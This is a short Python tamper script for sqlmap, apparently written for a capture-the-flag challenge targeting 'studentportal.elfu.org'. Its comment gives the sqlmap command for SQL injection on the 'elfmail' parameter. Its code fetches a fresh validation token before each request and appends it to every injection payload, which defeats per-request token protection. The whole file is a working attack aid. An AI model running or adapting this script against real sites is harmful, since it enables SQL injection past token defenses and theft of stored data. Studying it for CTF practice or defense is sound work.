#!/usr/bin/env python

###run with sqlmap -u "https://studentportal.elfu.org/application-check.php?elfmail=" --tamper=mytamper -p elfmail 

from lib.core.data import kb
from lib.core.enums import PRIORITY

import requests
import urllib

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    r = requests.get('https://studentportal.elfu.org/validator.php')
    token = 'token=' + r.text
    retVal = payload+'&'+token
    return retVal
